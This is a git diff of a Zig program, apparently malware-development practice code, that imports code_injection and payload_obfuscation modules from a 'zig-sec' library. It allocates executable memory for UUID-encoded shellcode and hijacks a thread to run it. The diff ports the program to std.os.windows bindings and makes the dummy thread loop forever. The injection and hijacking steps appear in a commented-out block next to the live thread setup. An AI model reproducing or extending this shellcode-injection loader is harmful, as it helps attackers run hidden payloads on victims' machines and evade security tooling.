@@ -1,6 +1,7 @@
 const std = @import("std");
-const win = @import("zigwin32").everything;
 const sec = @import("zig-sec");
+
+const win = std.os.windows;
 
 const code_injection = sec.code_injection;
 const payload_obfuscation = sec.payload_obfuscation;
@@ -8,8 +9,8 @@ const payload_obfuscation = sec.payload_obfuscation;
 const HANDLE = win.HANDLE;
 const INFINITE = win.INFINITE;
 
-const GetLastError = win.GetLastError;
-const CreateThread = win.CreateThread;
+const GetLastError = win.kernel32.GetLastError;
+const CreateThread = win.kernel32.CreateThread;
 const CloseHandle = win.CloseHandle;
 
 const uuid_array = [_][:0]const u8{
@@ -46,13 +47,14 @@ const uuid_array = [_][:0]const u8{
 //         0,
 //         @ptrCast(&dummyFunction),
 //         null,
-//         .{ .THREAD_CREATE_SUSPENDED = 1 },
+//         // THREAD_SUSPENDED
+//         4,
 //         null,
 //     ) orelse {
 //         std.debug.print("[!] CreateThread Failed With Error: {s}\n", .{@tagName(GetLastError())});
 //         return error.CreateThreadFailed;
 //     };
-//     defer _ = CloseHandle(h_thread);
+//     defer CloseHandle(h_thread);
 
 //     const shell_code_region = try code_injection.local.allocateExecutableMemory(shell_code);
 //     try sec.thread.hijackThread(h_thread, shell_code_region, false);
@@ -71,13 +73,13 @@ pub fn main() !void {
         0,
         @ptrCast(&dummyFunction),
         null,
-        .{},
+        0,
         null,
     ) orelse {
         std.debug.print("[!] CreateThread Failed With Error: {s}\n", .{@tagName(GetLastError())});
         return error.CreateThreadFailed;
     };
-    defer _ = CloseHandle(h_thread);
+    defer CloseHandle(h_thread);
 
     std.time.sleep(std.time.ns_per_s * 10);
 
@@ -86,9 +88,7 @@ pub fn main() !void {
 }
 
 fn dummyFunction() void {
-    var i: u8 = 0;
-    while (i < 100) {
-        i += 1;
+    while (true) {
         std.debug.print("We are in the dummy function\n", .{});
         std.time.sleep(std.time.ns_per_s * 2);
     }
